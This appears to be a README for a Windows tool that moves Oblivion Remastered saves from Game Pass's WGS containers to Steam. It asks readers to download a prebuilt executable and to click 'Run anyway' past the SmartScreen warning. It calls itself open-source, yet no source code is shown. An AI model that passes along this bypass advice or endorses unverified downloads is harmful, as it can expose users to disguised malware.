<p align="center">
  <img src="https://i.postimg.cc/VLMk6Hk1/banner.png" alt="Oblivion Remastered Game Pass to Steam Save Converter — Unpack WGS Saves to Steam" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-GamePass%20%E2%86%94%20Steam-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-oblivion--wgs--conv--v1.1-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# Oblivion Remastered Game Pass to Steam Save Converter — Unpack WGS Saves to Steam

**Spent dozens of hours closing Oblivion gates on PC Game Pass and switched to Steam for Nexus Mods and script extenders? Extract your hashed Xbox App WGS containers into Steam's Documents\My Games\Oblivion Remastered\Saved\SaveGames folder cleanly.**

Oblivion Remastered Game Pass to Steam Save Converter bridges Xbox App and Steam save storage on Windows: **parsing `container.index` inside `%LOCALAPPDATA%\Packages\BethesdaSoftworks.*\SystemAppData\wgs\`, restoring original save filenames, and detecting OneDrive-redirected `Documents` paths**.

This project is aimed at **The Elder Scrolls IV: Oblivion Remastered on Windows 10/11 PC** for migrating character saves between PC Game Pass and Steam.

## Quick Use-Case & Troubleshooting Reference

| Scenario / Issue | Cause | Solution |
| --- | --- | --- |
| Steam Oblivion Remastered Load menu is empty | Xbox App hides saves inside `SystemAppData\wgs` hashed containers | Decode `container.index` and extract save slots to Steam `SaveGames` |
| OneDrive splits `Documents\My Games\Oblivion Remastered` | Windows OneDrive redirects `Documents` away from `%USERPROFILE%\Documents` | Auto-detect the active `My Games\Oblivion Remastered\Saved\SaveGames` folder |
| Dozens of unnamed GUID folders inside `SystemAppData\wgs` | Each manual save and quicksave creates a separate container blob | Reconstruct proper save filenames with timestamps automatically |
| Keeping your Game Pass save untouched | Modifying `wgs` directly breaks Xbox cloud synchronization | Read `wgs` strictly in read-only mode and archive backups first |

## Download for Windows

[**Download OblivionWGSSave.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/OblivionWGSSave.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why use `OblivionWGSSave.exe`? (Key features)

- Locates `%LOCALAPPDATA%\Packages\BethesdaSoftworks.*\SystemAppData\wgs` for Oblivion Remastered automatically.
- Decodes `container.index` to recover all manual, quick, and autosave files with original names.
- Detects the active `Documents\My Games\Oblivion Remastered\Saved\SaveGames` directory (handling OneDrive paths).
- Creates dated backups of both folders before transferring converted saves.

### Sample Output

```text
[OblivionWGSSave] Scanning BethesdaSoftworks WGS & Steam My Games paths...
[OK]   Game Pass WGS    : C:\Users\Player\AppData\Local\Packages\BethesdaSoftworks.OblivionRemastered\SystemAppData\wgs
[OK]   Decoded Saves    : 9 character save slots extracted from container.index
[OK]   Backup Created   : Documents\OblivionRemaster-SaveBackup\2026-11-23\
[OK]   Steam Target     : C:\Users\Player\Documents\My Games\Oblivion Remastered\Saved\SaveGames
```

The release ZIP is named `OblivionWGSSave.zip`; the Windows executable inside is named `OblivionWGSSave.exe`.

1. Close Oblivion WGS Save Converter before updating or replacing executable files.
2. Click **Download OblivionWGSSave.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `OblivionWGSSave.exe`.
5. Review the options and output paths before processing files.

**Requirements:** Windows 10 or 11 (64-bit) with PC Game Pass and/or Steam versions of Oblivion Remastered installed.

### Verification & Windows SmartScreen Note

- **Offline & standard user permissions:** `OblivionWGSSave.exe` runs locally without uploading your personal files and does not require disabling Windows Defender.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project solves

### Containerized `wgs` storage blocking manual copy-paste

Xbox App wraps every save in binary containers that Steam cannot read directly.

### OneDrive `Documents` folder redirection

Automatically resolves the real `My Games\Oblivion Remastered` path used by Steam.

### Multi-slot character save extraction

Extracts all manual saves, quicksaves, and autosaves in one pass.

### 100% read-only safety on Xbox `wgs`

Leaves your PC Game Pass save completely untouched.

## Default folders and configuration paths

Oblivion Remastered separates PC Game Pass and Steam saves across `%LOCALAPPDATA%` and `Documents`:

```text
%LOCALAPPDATA%\Packages\BethesdaSoftworks.OblivionRemastered_*\SystemAppData\wgs\
```

Typical directory layout:

```text
Xbox Game Pass (Source):
%LOCALAPPDATA%\Packages\BethesdaSoftworks.OblivionRemastered_*\SystemAppData\wgs\<XUID>\
├── container.index
└── <ContainerGUID>\<HexBlob>

Steam Edition (Target):
%USERPROFILE%\Documents\My Games\Oblivion Remastered\Saved\SaveGames\
```

Launch Steam Oblivion Remastered once to the main menu to initialize `My Games\Oblivion Remastered\Saved\SaveGames` before converting.

## Quick start guide

Follow these steps to get started:

1. **Close Oblivion Remastered on both Xbox App and Steam.** Wait for cloud sync to finish.
2. **Run Steam Oblivion Remastered once to the main menu, then exit.** Initializes `Documents\My Games\Oblivion Remastered\Saved\SaveGames`.
3. **Extract `OblivionWGSSave.zip` and run `OblivionWGSSave.exe`.** Creates dated backups and writes converted saves to Steam.
4. **Launch Steam Oblivion Remastered, load your character, and create a fresh save.** Syncs your progress to Steam Cloud.

### Data safety note

Never delete or rename files inside `SystemAppData\wgs\`; work strictly with extracted copies.

## What the status summary shows

Oblivion WGS Save Converter displays **source `wgs` package path, decoded save count, backup path, and target Steam `SaveGames` folder**.

## FAQ

**Can I transfer my Oblivion Remastered save from PC Game Pass to Steam?**

Yes—unpacking the save payloads from `SystemAppData\wgs` into `My Games\Oblivion Remastered\Saved\SaveGames` works seamlessly.

**Does this delete my Xbox Game Pass save?**

No. Your `wgs` folder is read-only and remains completely untouched.

**What if my Documents folder is synced with OneDrive?**

Oblivion WGS Save Converter checks both standard and OneDrive `Documents` paths automatically.

## Useful reading

- [The Elder Scrolls IV: Oblivion Remastered on Steam](https://store.steampowered.com/app/2623190/The_Elder_Scrolls_IV_Oblivion_Remastered/)

## More Windows Gaming Utilities

- [Expedition33-GamePassSaveBridge](../Expedition33-GamePassSaveBridge) — Clair Obscur: Expedition 33 Game Pass ↔ Steam save bridge
- [Starfield-WGSSaveConverter](../Starfield-WGSSaveConverter) — Starfield Game Pass (`wgs`) ↔ Steam `.sfs` save converter
- [Fable2026-GamePassSaveBridge](../Fable2026-GamePassSaveBridge) — Fable (2026) Game Pass ↔ Steam save converter
- [UE5-EngineIniStutterTuner](../UE5-EngineIniStutterTuner) — One-click Unreal Engine 5 Engine.ini stutter & texture pool tuner

*Independent community project. Not affiliated with Bethesda Softworks, Virtuos, ZeniMax Media, Microsoft, Valve, or Steam.*
